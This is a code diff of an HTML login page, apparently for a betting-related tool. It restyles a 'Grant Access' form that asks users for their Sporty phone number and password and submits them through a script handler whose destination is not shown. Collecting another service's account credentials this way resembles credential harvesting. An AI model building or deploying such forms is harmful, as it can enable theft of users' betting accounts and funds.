@@ -21,16 +21,20 @@
     body {
       font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
       background: #06080b;       
-      height: 100vh;
+      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
+      padding: 20px;
     }
 
     .viewscreen_display {
-      display:flex;
+      display: flex;
       flex-direction: column;
       justify-content: space-between;
+      width: 100%;
+      max-width: 380px;
+      gap: 16px;
     }
 
     .details_panel_container {
@@ -40,10 +44,21 @@
       box-shadow: 0px 0px 100px #6c6b6b6f; 
       padding: 40px 30px;
       border-radius: 15px;
-      width: 380px;
+      width: 100%;
       display: flex;
       flex-direction: column;
       align-items: center;
+    }
+
+    /* Mobile responsive adjustments */
+    @media (max-width: 480px) {
+      body {
+        padding: 16px;
+      }
+
+      .details_panel_container {
+        padding: 32px 24px;
+      }
     }
 
     .phone_number_wrapper {
@@ -54,26 +69,31 @@
 
     .logo_sms {
       font-size: 15px;
-      color: #e0e0e0;
-      padding-bottom: 2px; /* fine-tune if needed */
+      color: #666;
+      padding-bottom: 0px;
+      font-family: inherit;
     }
 
     .phone_number_wrapper input {
       flex: 1;
       padding: 10px 0px;
       color: #e0e0e0;
+      background-color: #000000;
       border: none;
       border-bottom: 2px solid gray;
       outline: none;
       font-size: 15px;
       transition: border-color 0.3s ease;
+      /* iOS Safari fixes */
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      appearance: none;
+      border-radius: 0;
     }
 
-    .logo_sms {
-      font-size: 16px;
-      color: #666;  /* Match placeholder color */
-      padding-bottom: 0px;  /* Remove the padding */
-      font-family: inherit;  /* Use same font as input */
+    .phone_number_wrapper input:focus {
+      color: white;
+      border-bottom-color: #e0e0e0;
     }
 
     .logo_panel {
@@ -85,12 +105,6 @@
       min-width: 270px;
       margin-bottom: 16px;
     }
-
-    /* .logo_panel img{
-      width: 30px;
-      height: 30px;
-      margin-right: 5px;
-    } */
 
     .logo_panel div{
       color: #e0e0e0;
@@ -148,16 +162,22 @@
       border: none;
       color: #e0e0e0;
       background-color: #000000;
-      border-bottom: 2px solid #e0e0e0;
+      border-bottom: 2px solid gray;
       outline:none;
       font-size: 15px;
       outline: none;
       transition: border-color 0.3s ease;
+      /* iOS Safari fixes */
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      appearance: none;
+      border-radius: 0;
     }
 
     .form_group input:focus {
+      color: white;
       box-shadow: none;
-      border-bottom-color: black;
+      border-bottom-color: #e0e0e0;
     }
 
     .details_btn {
@@ -240,7 +260,6 @@
       <h1>Grant Access</h1>
       <div>
         Provide your Sporty login details 
-        <!-- <br>Account details will not be misused -->
       </div>
     </div>
 
@@ -249,15 +268,14 @@
       <!-- details form -->
       <form action="#" method="post" class="sporty_details_form details_form">
         
-        <!-- Email or Username -->
-
-          <div class="form_group">
-            <label for="phone_number">Phone Number</label>
-            <div class="phone_number_wrapper">
-              <div class="logo_sms">+234</div>
-              <input type="text" id="phone_number" name="phone_number" placeholder="Enter your Phone Number" required>
-            </div>
+        <!-- Phone Number -->
+        <div class="form_group">
+          <label for="phone_number">Phone Number</label>
+          <div class="phone_number_wrapper">
+            <div class="logo_sms">+234</div>
+            <input type="text" id="phone_number" name="phone_number" placeholder="Enter your Phone Number" required>
           </div>
+        </div>
 
         <!-- Password -->
         <div class="form_group">
@@ -283,8 +301,7 @@
   const form = document.querySelector(".sporty_details_form");
   form.addEventListener("submit", handleBetDetails)
 
-  async function handleBetDetails(){
-
+  async function handleBetDetails(event){
     event.preventDefault();
 
     let phone_number = document.querySelector("#phone_number").value
@@ -334,10 +351,7 @@
       alert(result.detail || "")
     }
   }
-
-
 </script>
-
 
 </body>
 </html>
